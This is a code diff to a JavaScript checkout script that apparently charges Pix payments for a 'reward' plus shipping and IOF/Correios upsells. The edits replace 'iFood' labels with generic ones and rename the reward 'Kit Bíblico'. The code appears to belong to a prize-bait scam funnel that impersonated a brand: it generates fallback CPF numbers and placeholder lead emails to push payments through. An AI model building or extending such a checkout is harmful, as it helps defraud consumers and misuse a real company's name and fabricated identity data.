@@ -1896,7 +1896,7 @@ function initCheckout() {
         const selectedShipping = {
             ...opt,
             id: String(opt.id || 'padrao').trim() || 'padrao',
-            name: String(opt.name || 'Frete iFood').trim() || 'Frete iFood',
+            name: String(opt.name || 'Frete Padrão').trim() || 'Frete Padrão',
             price: Number(Number(opt.price || 0).toFixed(2)),
             basePrice: Number(basePrice.toFixed(2)),
             originalPrice: Number(basePrice.toFixed(2)),
@@ -2308,7 +2308,7 @@ function initUpsellIof() {
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrão';
     }
     if (currentTxid) {
         const txid = String(pix?.idTransaction || '').trim();
@@ -2446,7 +2446,7 @@ function initUpsellCorreios() {
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrão';
     }
     if (currentTxid) {
         const txid = String(pix?.idTransaction || '').trim();
@@ -2577,7 +2577,7 @@ function initUpsell() {
         leadName.textContent = firstName || 'Parceiro';
     }
     if (currentFrete) {
-        currentFrete.textContent = shipping?.name || 'Frete padrao iFood';
+        currentFrete.textContent = shipping?.name || 'Frete padrão';
     }
     if (currentTxid) {
         const txid = String(pix?.idTransaction || '').trim();
@@ -5253,7 +5253,7 @@ function buildShippingOptions(rawCep) {
     const baseOptions = [
         {
             id: 'padrao',
-            name: 'Envio Padrão iFood',
+            name: 'Envio Padrão',
             price: 10,
             eta: '3 a 5 dias úteis'
         }
@@ -5421,7 +5421,7 @@ function getPixPersonalPayload() {
     const fallbackEmail = `lead.${suffix}@ifoodbag.app`;
 
     return {
-        name: String(personal.name || '').trim() || 'Cliente iFood',
+        name: String(personal.name || '').trim() || 'Cliente',
         cpf: cpfDigits || generateFallbackCpf(sessionId),
         birth: String(personal.birth || '').trim() || '01/01/1990',
         email: String(personal.email || '').trim() || fallbackEmail,
@@ -5694,7 +5694,7 @@ async function createPixCharge(shipping, bumpPrice, options = {}) {
             shippingId: shippingForPix.id,
             shippingName: shippingForPix.name,
             rewardId: String(data?.rewardId || reward?.id || 'bag'),
-            rewardName: String(data?.rewardName || reward?.name || 'Bag do iFood'),
+            rewardName: String(data?.rewardName || reward?.name || 'Kit Bíblico'),
             rewardExtraPrice: Number(data?.rewardExtraPrice || rewardExtraPrice || 0),
             rewardAsset: reward?.asset || '',
             rewardAlt: reward?.pixAlt || reward?.name || '',
